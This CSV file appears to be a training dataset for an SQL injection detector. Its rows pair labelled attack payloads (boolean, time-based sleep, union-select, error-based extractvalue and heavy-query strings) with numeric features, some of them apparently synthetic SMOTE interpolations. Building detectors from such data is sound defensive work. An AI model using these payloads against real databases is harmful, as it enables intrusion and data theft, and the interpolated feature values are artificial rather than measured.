id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000153,attack,boolean,"1 where 7906  =  7906 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006084,0.1015022856573891,113.82872504227167,31.435188468041794,3.826476020988781,37.30556540412539,21.0,42.30556540412538,13.217594234020897,0.32745449421215767,0.18487334888929782,0.371471958233419,0.11620019866512554,0.0,0.0,2.0,0.0,1.0,2.0,0.0,6.217594234020898,0.0,1.0,1.0,5.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000154,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R008458,0.8168562633166322,65.35621794840446,24.45976362177528,3.5986721534327386,17.620709134674165,13.678108974202235,25.67810897420223,8.379290865325839,0.2763823366242816,0.20497859762807197,0.3913079043892897,0.1273311613583568,1.0,0.0,2.0,0.0,0.0,1.4597636217752792,0.0,3.459763621775279,0.0,0.0,0.4597636217752792,3.459763621775279,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000155,attack,boolean,1' in boolean mode  )   and 4457  =  3885#,nearest_attack_euclidean,R007438,0.1203449644867891,42.0,19.39556019290843,3.691631452268383,16.0,9.0,12.999999999999996,4.0,0.38095238095238093,0.21428571428571427,0.30952380952380953,0.09523809523809523,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000156,attack,boolean,"-5245' or elt  (  1032  =  1032,3623  )   and 'qfvo'  =  'qfvo",nearest_attack_euclidean,R006132,0.006391691753845395,62.0,25.0,3.8674991256194446,16.0,16.0,20.0,10.0,0.25806451612903225,0.25806451612903225,0.3225806451612903,0.16129032258064516,4.0,0.0,1.0,0.0,0.0,2.0,0.0,1.9999999999999991,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000157,attack,boolean,"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",nearest_attack_euclidean,R003981,0.23408512326369765,127.72182158449333,28.0,3.4407964964112567,42.0,13.0,57.9348513204111,14.78697026408222,0.33049518795704225,0.10229612960575117,0.45169008057341553,0.11551860186379108,0.0,4.0,0.0,0.0,0.0,2.0,0.0,8.786970264082221,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000158,attack,time,1'+  (  select ukwc where 3008  =  3008 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R003933,0.2650160415893868,116.3986701248872,28.199335062443602,3.484139310910452,42.0,10.0,50.0,14.398670124887206,0.3608456936553724,0.08591564134651725,0.4295782067325862,0.12366045826552419,1.3986701248872055,0.0,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000159,attack,error,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R005929,0.18650824839517602,168.1492354802758,27.0,3.5641358547962434,39.0,35.0,68.5564875545221,25.592747925753685,0.23226157222078803,0.2084398725058354,0.40708288752821664,0.15221566774515996,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.592747925753685,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000160,attack,union,-7940'  )   union all select 6024--,nearest_attack_euclidean,R000990,0.0,35.0,20.0,3.943289445392768,14.0,8.0,8.0,5.0,0.4,0.22857142857142856,0.22857142857142856,0.14285714285714285,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000161,attack,boolean,"-9854%""   )    )     )   or 6455  =  3652",nearest_attack_euclidean,R003604,0.19382966351118294,39.635588681779396,15.0,2.9001747704562657,2.0,12.0,18.908470945423517,6.727117736355879,0.05062928362902519,0.30377570177415125,0.47597258477423865,0.16962242982258488,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.72711773635588,0.9999999999999999,0.0,0.0,2.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000162,attack,boolean,-5830'  )   as fivy where 2173  =  2173 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R003753,0.15699246298614944,152.44136678212863,37.30727412539051,4.354016294198061,61.96091118808576,26.0,44.65363706269525,19.826818531347627,0.40632217714693697,0.17064596792049508,0.29296008071917956,0.13007177421338834,4.826818531347626,0.0,3.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,0.0,9.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000163,attack,error,"-1639   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   3318  =  3318",nearest_attack_euclidean,R005676,0.12604961229565836,372.3238454030379,33.953736370994584,3.409310465147633,83.04626362900541,59.86120911298376,168.37010903204333,61.04626362900541,0.22304969856681328,0.16078630142882858,0.4522035530130915,0.16396044699126663,0.0,0.0,0.9537363709945849,0.0,0.0,3.0,0.0,34.092527258010826,0.0,0.0,1.0,23.953736370994584,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,0.0,1.0,1.0462636290054155,0.9537363709945847,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000164,attack,other,"iif  (  1157  =  4542,1,1/0  )  ",nearest_attack_euclidean,R001306,0.03106963444000617,32.0,13.83139761740192,3.145101413317186,3.0,11.0,12.0,6.0,0.09375,0.34375,0.375,0.1875,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.440892098500626e-16
SMOTE_000165,attack,boolean,-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107,nearest_attack_euclidean,R000827,0.2855106676499819,68.27420947988442,19.0,3.1688669722753775,5.0,24.0,30.80646526847236,8.46774421141206,0.07373494695240074,0.35392774537152366,0.4484405797495501,0.12389672792652554,0.0,0.0,1.0,0.0,1.0,2.0,0.0,4.467744211412059,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000166,attack,other,select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,nearest_attack_euclidean,R004194,0.0028000999985959346,111.0,29.0,3.806029454114367,42.0,20.0,39.0,10.0,0.3783783783783784,0.18018018018018017,0.35135135135135137,0.09009009009009009,0.0,0.0,0.0,0.0,1.0,1.0,0.0,6.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000167,attack,union,"-5097'  )   union all select 8992,8992,8992,8992,8992,8992,8992,8992,8992--",nearest_attack_euclidean,R002979,0.00545648656453187,75.0,21.0,3.574267612845893,14.0,40.0,8.0,13.0,0.18666666666666668,0.5333333333333333,0.10666666666666672,0.17333333333333334,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.0,3.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000168,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R008752,0.042006323049121996,72.70540163510191,16.0,3.119027022503494,46.28216065404076,1.0,14.282160654040759,11.14108032702038,0.6368338570251095,0.013769410292157558,0.19621272767606845,0.15318400500666438,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0705401635101897,0.0,0.0,7.07054016351019,0.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000169,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000679,0.010519059000326457,55.0,21.946932757846156,4.034897153242941,14.0,24.0,8.0,9.0,0.2545454545454545,0.4363636363636363,0.14545454545454545,0.16363636363636364,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.0,3.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000170,attack,error,"1   )    )    as gcvw where 7363  =  7363 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R003014,0.5914640743075087,330.5094869945434,39.24841883424277,3.992230040456034,109.0,63.0,123.50948699454341,35.0,0.32981434250124514,0.19062663832640775,0.37365533121323163,0.10590368795911542,0.0,0.24841883424276479,2.0,0.0,2.0,2.0,0.0,21.751581165757234,0.0,0.0,6.0,7.0,0.0,0.2484188342427648,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,6.0,3.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,14.0
SMOTE_000171,attack,boolean,"1'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000784,0.07062636004560423,117.26158539895162,33.0,3.537781911227213,31.0,15.0,53.00926831916129,18.252317079790323,0.2644550336728768,0.1279621130675211,0.4519430524563427,0.15563980080325937,3.0,0.0,2.0,1.0,0.0,1.0,0.0,10.252317079790323,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000172,attack,boolean,"1%""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R007128,0.26541631839780777,88.07061067505612,19.64236640503367,2.8219758835603694,9.856488540044896,13.0,48.0,17.214122135011223,0.111554098814143,0.1476864144458109,0.5453036841076094,0.19545580263243661,0.0,4.0,0.0,0.0,0.0,2.0,0.0,8.0,2.0,0.21412213501122368,1.0,2.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000173,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R006219,0.43842388459687565,187.79214101167025,29.792141011670246,3.858147735084293,66.0,37.0,66.0,18.792141011670246,0.3514540531695803,0.19702727223143138,0.3514540531695803,0.10006462142940811,0.7921410116702473,0.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,5.0,0.9999999999999996,0.7921410116702473,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000174,attack,other,"iif  (  2452  =  8999,1,1/0  )  ",nearest_attack_euclidean,R001074,0.0002772387402350711,32.0,15.0,3.2569216582669895,3.0,11.0,12.0,6.0,0.09375,0.34375,0.375,0.1875,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.440892098500626e-16
SMOTE_000175,attack,boolean,"-6636'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'kgip'  =  'kgip",nearest_attack_euclidean,R004991,0.0020267140621102442,96.0,24.0,3.1419210959575192,16.0,16.0,48.0,16.0,0.16666666666666669,0.16666666666666666,0.5,0.16666666666666666,4.0,0.0,1.0,0.0,0.0,2.0,0.0,8.0,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,other,"1"" where 9230  =  9230",nearest_attack_euclidean,R001494,0.0,21.999999999999986,12.0,3.299896391167891,5.0,9.0,6.0,2.0,0.22727272727272727,0.4090909090909091,0.2727272727272727,0.09090909090909091,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999996,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000177,attack,other,1'   )    )    as nhkp where 8030  =  8030,nearest_attack_euclidean,R001806,8.429369702178807e-08,42.0,17.0,3.1766352793034835,11.0,9.0,18.0,4.0,0.2619047619047619,0.21428571428571427,0.42857142857142855,0.09523809523809523,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000178,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R006929,0.06964014816139488,76.2883212458478,15.0,3.076210371673154,45.43065699667824,1.0,18.0,11.85766424916956,0.595400038137667,0.013115382170662382,0.2360768790719227,0.15540770061974793,0.0,0.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,6.85766424916956,2.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000179,attack,union,"1%"" union all select null,null,null#",nearest_attack_euclidean,R006948,0.4737278893017697,34.62030936660953,15.770051561101589,3.4980062311795392,25.080206244406355,1.0,4.0,4.540103122203176,0.724777204876649,0.029055269104991177,0.11622107641996471,0.1299464495983951,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7700515611015882,0.0,1.7700515611015883,0.0,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000180,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R008471,0.008860706621049106,82.14214759816744,21.0,3.7168939349038483,14.0,40.05685903926698,14.056859039266982,14.028429519633491,0.17046791272874548,0.48766921226049775,0.17108594576425612,0.17077692924650079,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.0142147598167446,0.0,0.0,8.014214759816745,3.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000181,attack,boolean,"-2722""  )   or 4907  =  8126#",nearest_attack_euclidean,R003630,0.021919309218496556,29.0,15.902754020029734,3.359266762066964,2.0,12.0,10.0,5.0,0.06896551724137934,0.41379310344827586,0.3448275862068966,0.1724137931034483,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000182,attack,boolean,"1'||  (  select 'xyrk' from dual where 9844  =  9844 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R005733,0.6112546702068513,175.3285012030766,37.37713349374354,4.391090982526107,92.50853397497417,16.68856674687177,44.754266987487085,21.377133493743543,0.5276204882559958,0.09523089205335411,0.2552409765119917,0.12190764317865835,3.0,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.688566746871772,7.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,2.0,0.0,1.0,1.6885667468717722,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.688566746871772
SMOTE_000183,attack,union,"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",nearest_attack_euclidean,R008112,0.055375235591165646,98.48121580476631,28.0,3.9197542415716535,19.0,51.584972643813046,14.0,13.896243160953262,0.19297839025461422,0.523736199214447,0.1421946033455052,0.14109080718543354,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.896243160953262,2.0,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
